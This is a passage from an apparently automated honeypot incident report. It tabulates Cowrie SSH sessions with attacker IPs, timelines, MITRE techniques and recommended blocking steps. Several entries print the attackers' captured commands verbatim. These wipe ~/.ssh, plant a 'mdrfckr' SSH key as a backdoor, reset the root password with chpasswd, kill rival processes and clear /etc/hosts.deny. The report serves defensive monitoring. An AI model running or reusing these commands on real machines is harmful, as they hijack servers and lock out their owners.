| `2026-06-10 04:48:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.162[.]149` to AbuseIPDB if not already reported
- [ ] Block `64.89.162[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ab7040dbd98

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-10 04:48 |
| **Last Seen** | 2026-06-10 04:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:48:32` | `cowrie.session.connect` |
| `2026-06-10 04:48:32` | `cowrie.client.version` |
| `2026-06-10 04:48:32` | `cowrie.client.kex` |
| `2026-06-10 04:48:33` | `cowrie.login.success` |
| `2026-06-10 04:48:33` | `cowrie.session.params` |
| `2026-06-10 04:48:33` | `cowrie.command.input` |
| `2026-06-10 04:48:33` | `cowrie.command.failed` |
| `2026-06-10 04:48:33` | `cowrie.log.closed` |
| `2026-06-10 04:48:34` | `cowrie.session.params` |
| `2026-06-10 04:48:34` | `cowrie.command.input` |
| `2026-06-10 04:48:34` | `cowrie.session.file_download` |
| `2026-06-10 04:48:34` | `cowrie.log.closed` |
| `2026-06-10 04:48:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf987a5c71ba

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-10 04:48 |
| **Last Seen** | 2026-06-10 04:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:48:36` | `cowrie.session.connect` |
| `2026-06-10 04:48:36` | `cowrie.client.version` |
| `2026-06-10 04:48:36` | `cowrie.client.kex` |
| `2026-06-10 04:48:36` | `cowrie.login.success` |
| `2026-06-10 04:48:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d889d05d402

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-06-10 04:49 |
| **Last Seen** | 2026-06-10 04:50 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:49:45` | `cowrie.session.connect` |
| `2026-06-10 04:49:45` | `cowrie.client.version` |
| `2026-06-10 04:49:45` | `cowrie.client.kex` |
| `2026-06-10 04:49:48` | `cowrie.login.success` |
| `2026-06-10 04:49:48` | `cowrie.session.params` |
| `2026-06-10 04:49:48` | `cowrie.command.input` |
| `2026-06-10 04:49:48` | `cowrie.command.failed` |
| `2026-06-10 04:49:49` | `cowrie.log.closed` |
| `2026-06-10 04:49:49` | `cowrie.session.params` |
| `2026-06-10 04:49:49` | `cowrie.command.input` |
| `2026-06-10 04:49:49` | `cowrie.session.file_download` |
| `2026-06-10 04:49:49` | `cowrie.log.closed` |
| `2026-06-10 04:50:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e02e91d38e3

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-06-10 04:50 |
| **Last Seen** | 2026-06-10 04:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:50:01` | `cowrie.session.connect` |
| `2026-06-10 04:50:01` | `cowrie.client.version` |
| `2026-06-10 04:50:01` | `cowrie.client.kex` |
| `2026-06-10 04:50:02` | `cowrie.login.success` |
| `2026-06-10 04:50:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f069da20069

| Field | Detail |
|---|---|
| **Source IP** | `14.103.118[.]189` |
| **First Seen** | 2026-06-10 04:56 |
| **Last Seen** | 2026-06-10 04:56 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:fvKxI2Aq8Y6p"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:56:17` | `cowrie.session.connect` |
| `2026-06-10 04:56:17` | `cowrie.client.version` |
| `2026-06-10 04:56:18` | `cowrie.client.kex` |
| `2026-06-10 04:56:18` | `cowrie.login.success` |
| `2026-06-10 04:56:19` | `cowrie.session.params` |
| `2026-06-10 04:56:19` | `cowrie.command.input` |
| `2026-06-10 04:56:19` | `cowrie.command.failed` |
| `2026-06-10 04:56:19` | `cowrie.log.closed` |
| `2026-06-10 04:56:19` | `cowrie.session.params` |
| `2026-06-10 04:56:19` | `cowrie.command.input` |
| `2026-06-10 04:56:20` | `cowrie.session.file_download` |
| `2026-06-10 04:56:20` | `cowrie.log.closed` |
| `2026-06-10 04:56:33` | `cowrie.session.params` |
| `2026-06-10 04:56:33` | `cowrie.command.input` |
| `2026-06-10 04:56:33` | `cowrie.log.closed` |
| `2026-06-10 04:56:34` | `cowrie.session.params` |
| `2026-06-10 04:56:34` | `cowrie.command.input` |
| `2026-06-10 04:56:34` | `cowrie.log.closed` |
| `2026-06-10 04:56:35` | `cowrie.session.params` |
| `2026-06-10 04:56:35` | `cowrie.command.input` |
| `2026-06-10 04:56:35` | `cowrie.session.file_download` |
| `2026-06-10 04:56:35` | `cowrie.log.closed` |
| `2026-06-10 04:56:35` | `cowrie.session.params` |
| `2026-06-10 04:56:35` | `cowrie.command.input` |
| `2026-06-10 04:56:35` | `cowrie.log.closed` |
| `2026-06-10 04:56:36` | `cowrie.session.params` |
| `2026-06-10 04:56:36` | `cowrie.command.input` |
| `2026-06-10 04:56:36` | `cowrie.log.closed` |
| `2026-06-10 04:56:36` | `cowrie.session.params` |
| `2026-06-10 04:56:36` | `cowrie.command.input` |
| `2026-06-10 04:56:36` | `cowrie.command.input` |
| `2026-06-10 04:56:36` | `cowrie.log.closed` |
| `2026-06-10 04:56:36` | `cowrie.session.params` |
| `2026-06-10 04:56:36` | `cowrie.command.input` |
| `2026-06-10 04:56:37` | `cowrie.log.closed` |
| `2026-06-10 04:56:37` | `cowrie.session.params` |
| `2026-06-10 04:56:37` | `cowrie.command.input` |
| `2026-06-10 04:56:37` | `cowrie.log.closed` |
| `2026-06-10 04:56:37` | `cowrie.session.params` |
| `2026-06-10 04:56:37` | `cowrie.command.input` |
| `2026-06-10 04:56:37` | `cowrie.log.closed` |
| `2026-06-10 04:56:38` | `cowrie.session.params` |
| `2026-06-10 04:56:38` | `cowrie.command.input` |
| `2026-06-10 04:56:38` | `cowrie.log.closed` |
| `2026-06-10 04:56:39` | `cowrie.session.params` |
| `2026-06-10 04:56:39` | `cowrie.command.input` |
| `2026-06-10 04:56:39` | `cowrie.log.closed` |
| `2026-06-10 04:56:39` | `cowrie.session.params` |
| `2026-06-10 04:56:39` | `cowrie.command.input` |
| `2026-06-10 04:56:39` | `cowrie.log.closed` |
| `2026-06-10 04:56:40` | `cowrie.session.params` |
| `2026-06-10 04:56:40` | `cowrie.command.input` |
| `2026-06-10 04:56:40` | `cowrie.log.closed` |
| `2026-06-10 04:56:40` | `cowrie.session.params` |
| `2026-06-10 04:56:40` | `cowrie.command.input` |
| `2026-06-10 04:56:40` | `cowrie.log.closed` |
| `2026-06-10 04:56:40` | `cowrie.session.params` |
| `2026-06-10 04:56:40` | `cowrie.command.input` |
| `2026-06-10 04:56:41` | `cowrie.log.closed` |
| `2026-06-10 04:56:41` | `cowrie.session.params` |
| `2026-06-10 04:56:41` | `cowrie.command.input` |
| `2026-06-10 04:56:41` | `cowrie.log.closed` |
| `2026-06-10 04:56:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.118[.]189` to AbuseIPDB if not already reported
- [ ] Block `14.103.118[.]189` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abaac3e964d1

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-10 04:57 |
| **Last Seen** | 2026-06-10 04:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:57:05` | `cowrie.session.connect` |
| `2026-06-10 04:57:05` | `cowrie.client.version` |
| `2026-06-10 04:57:06` | `cowrie.client.kex` |
| `2026-06-10 04:57:06` | `cowrie.login.success` |
| `2026-06-10 04:57:06` | `cowrie.session.params` |
| `2026-06-10 04:57:06` | `cowrie.command.input` |
| `2026-06-10 04:57:06` | `cowrie.command.failed` |
| `2026-06-10 04:57:07` | `cowrie.log.closed` |
| `2026-06-10 04:57:07` | `cowrie.session.params` |
| `2026-06-10 04:57:07` | `cowrie.command.input` |
| `2026-06-10 04:57:07` | `cowrie.session.file_download` |
| `2026-06-10 04:57:07` | `cowrie.log.closed` |
| `2026-06-10 04:57:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bc21125a458

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-10 04:57 |
| **Last Seen** | 2026-06-10 04:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:57:09` | `cowrie.session.connect` |
| `2026-06-10 04:57:09` | `cowrie.client.version` |
| `2026-06-10 04:57:09` | `cowrie.client.kex` |
| `2026-06-10 04:57:10` | `cowrie.login.success` |
| `2026-06-10 04:57:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1ce105681e2

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-10 04:59 |
| **Last Seen** | 2026-06-10 04:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:59:11` | `cowrie.session.connect` |
| `2026-06-10 04:59:11` | `cowrie.client.version` |
| `2026-06-10 04:59:11` | `cowrie.client.kex` |
| `2026-06-10 04:59:12` | `cowrie.login.success` |
| `2026-06-10 04:59:12` | `cowrie.session.params` |
| `2026-06-10 04:59:12` | `cowrie.command.input` |
| `2026-06-10 04:59:12` | `cowrie.command.failed` |
| `2026-06-10 04:59:12` | `cowrie.log.closed` |
| `2026-06-10 04:59:13` | `cowrie.session.params` |
| `2026-06-10 04:59:13` | `cowrie.command.input` |
| `2026-06-10 04:59:13` | `cowrie.session.file_download` |
| `2026-06-10 04:59:13` | `cowrie.log.closed` |
| `2026-06-10 04:59:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c04cf97052f8

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-10 04:59 |
| **Last Seen** | 2026-06-10 04:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:59:15` | `cowrie.session.connect` |
| `2026-06-10 04:59:15` | `cowrie.client.version` |
| `2026-06-10 04:59:15` | `cowrie.client.kex` |
| `2026-06-10 04:59:15` | `cowrie.login.success` |
| `2026-06-10 04:59:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9702f5b2b643

| Field | Detail |
|---|---|
| **Source IP** | `14.103.118[.]189` |
| **First Seen** | 2026-06-10 05:06 |
| **Last Seen** | 2026-06-10 05:06 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:zQq5YlC8REjo"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 05:06:36` | `cowrie.session.connect` |
| `2026-06-10 05:06:36` | `cowrie.client.version` |
| `2026-06-10 05:06:36` | `cowrie.client.kex` |
| `2026-06-10 05:06:37` | `cowrie.login.success` |
| `2026-06-10 05:06:38` | `cowrie.session.params` |
| `2026-06-10 05:06:38` | `cowrie.command.input` |
| `2026-06-10 05:06:38` | `cowrie.command.failed` |
| `2026-06-10 05:06:38` | `cowrie.log.closed` |
| `2026-06-10 05:06:38` | `cowrie.session.params` |
| `2026-06-10 05:06:38` | `cowrie.command.input` |
| `2026-06-10 05:06:39` | `cowrie.session.file_download` |
| `2026-06-10 05:06:39` | `cowrie.log.closed` |
| `2026-06-10 05:06:52` | `cowrie.session.params` |
| `2026-06-10 05:06:52` | `cowrie.command.input` |
| `2026-06-10 05:06:52` | `cowrie.log.closed` |
| `2026-06-10 05:06:52` | `cowrie.session.params` |
| `2026-06-10 05:06:52` | `cowrie.command.input` |
| `2026-06-10 05:06:52` | `cowrie.log.closed` |
| `2026-06-10 05:06:53` | `cowrie.session.params` |
| `2026-06-10 05:06:53` | `cowrie.command.input` |
| `2026-06-10 05:06:53` | `cowrie.session.file_download` |
| `2026-06-10 05:06:53` | `cowrie.log.closed` |
| `2026-06-10 05:06:53` | `cowrie.session.params` |
| `2026-06-10 05:06:53` | `cowrie.command.input` |
| `2026-06-10 05:06:53` | `cowrie.log.closed` |
| `2026-06-10 05:06:54` | `cowrie.session.params` |
| `2026-06-10 05:06:54` | `cowrie.command.input` |
| `2026-06-10 05:06:54` | `cowrie.log.closed` |
| `2026-06-10 05:06:54` | `cowrie.session.params` |
| `2026-06-10 05:06:54` | `cowrie.command.input` |
| `2026-06-10 05:06:54` | `cowrie.command.input` |
| `2026-06-10 05:06:54` | `cowrie.log.closed` |
| `2026-06-10 05:06:54` | `cowrie.session.params` |
| `2026-06-10 05:06:54` | `cowrie.command.input` |
| `2026-06-10 05:06:55` | `cowrie.log.closed` |
| `2026-06-10 05:06:55` | `cowrie.session.params` |
| `2026-06-10 05:06:55` | `cowrie.command.input` |
| `2026-06-10 05:06:55` | `cowrie.log.closed` |
| `2026-06-10 05:06:55` | `cowrie.session.params` |
| `2026-06-10 05:06:55` | `cowrie.command.input` |
| `2026-06-10 05:06:55` | `cowrie.log.closed` |
| `2026-06-10 05:06:56` | `cowrie.session.params` |
| `2026-06-10 05:06:56` | `cowrie.command.input` |
| `2026-06-10 05:06:56` | `cowrie.log.closed` |
| `2026-06-10 05:06:56` | `cowrie.session.params` |
| `2026-06-10 05:06:56` | `cowrie.command.input` |
| `2026-06-10 05:06:56` | `cowrie.log.closed` |
| `2026-06-10 05:06:57` | `cowrie.session.params` |
| `2026-06-10 05:06:57` | `cowrie.command.input` |
| `2026-06-10 05:06:57` | `cowrie.log.closed` |
| `2026-06-10 05:06:57` | `cowrie.session.params` |
| `2026-06-10 05:06:57` | `cowrie.command.input` |
| `2026-06-10 05:06:57` | `cowrie.log.closed` |
| `2026-06-10 05:06:57` | `cowrie.session.params` |
| `2026-06-10 05:06:57` | `cowrie.command.input` |
| `2026-06-10 05:06:58` | `cowrie.log.closed` |
| `2026-06-10 05:06:58` | `cowrie.session.params` |
| `2026-06-10 05:06:58` | `cowrie.command.input` |
| `2026-06-10 05:06:58` | `cowrie.log.closed` |
| `2026-06-10 05:06:58` | `cowrie.session.params` |
| `2026-06-10 05:06:58` | `cowrie.command.input` |
| `2026-06-10 05:06:58` | `cowrie.log.closed` |
| `2026-06-10 05:06:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.118[.]189` to AbuseIPDB if not already reported
- [ ] Block `14.103.118[.]189` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-389a9111c073

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-10 05:16 |
| **Last Seen** | 2026-06-10 05:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 05:16:23` | `cowrie.session.connect` |
| `2026-06-10 05:16:23` | `cowrie.client.version` |
| `2026-06-10 05:16:23` | `cowrie.client.kex` |
| `2026-06-10 05:16:24` | `cowrie.login.success` |
| `2026-06-10 05:16:24` | `cowrie.session.params` |
| `2026-06-10 05:16:24` | `cowrie.command.input` |
| `2026-06-10 05:16:24` | `cowrie.command.failed` |
| `2026-06-10 05:16:25` | `cowrie.log.closed` |
| `2026-06-10 05:16:25` | `cowrie.session.params` |
| `2026-06-10 05:16:25` | `cowrie.command.input` |
| `2026-06-10 05:16:25` | `cowrie.session.file_download` |
| `2026-06-10 05:16:25` | `cowrie.log.closed` |
| `2026-06-10 05:16:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92073453800d

| Field | Detail |
|---|---|
| **Source IP** | `4.182.219[.]135` |
| **First Seen** | 2026-06-10 05:16 |
| **Last Seen** | 2026-06-10 05:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 05:16:27` | `cowrie.session.connect` |
| `2026-06-10 05:16:27` | `cowrie.client.version` |
| `2026-06-10 05:16:27` | `cowrie.client.kex` |
| `2026-06-10 05:16:28` | `cowrie.login.success` |
| `2026-06-10 05:16:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.182.219[.]135` to AbuseIPDB if not already reported
- [ ] Block `4.182.219[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-805a9a1b48c3

| Field | Detail |
|---|---|
